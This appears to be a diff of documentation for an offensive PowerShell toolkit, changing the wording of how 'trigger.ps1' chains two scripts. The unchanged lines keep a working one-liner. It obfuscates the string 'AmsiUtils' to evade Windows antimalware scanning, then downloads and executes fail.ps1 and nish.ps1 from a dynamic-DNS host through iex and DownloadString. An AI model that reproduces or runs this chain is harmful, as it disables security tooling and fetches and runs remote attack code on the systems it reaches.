@@ -33,7 +33,7 @@ Running all in one:
 -------------------
 trigger.ps1:  
 ------------
-This script is going to be the trigger for the 2 invokes(fail.ps1, nish.ps1), it also defines the $am of fail.ps1:
+This script is going to be the trigger for the 2 invokes(fail.ps1, nish.ps1), it also defines the $am variable for the fail.ps1:
 
 $n = (new-object net.webClient);$am='Amsi'+'U'+'til'+'s';iex ($n).DownloadString('http://example.ddns.net:80/fail.ps1');iex ($n).DownloadString('http://example.ddns.net:80/nish.ps1')
 
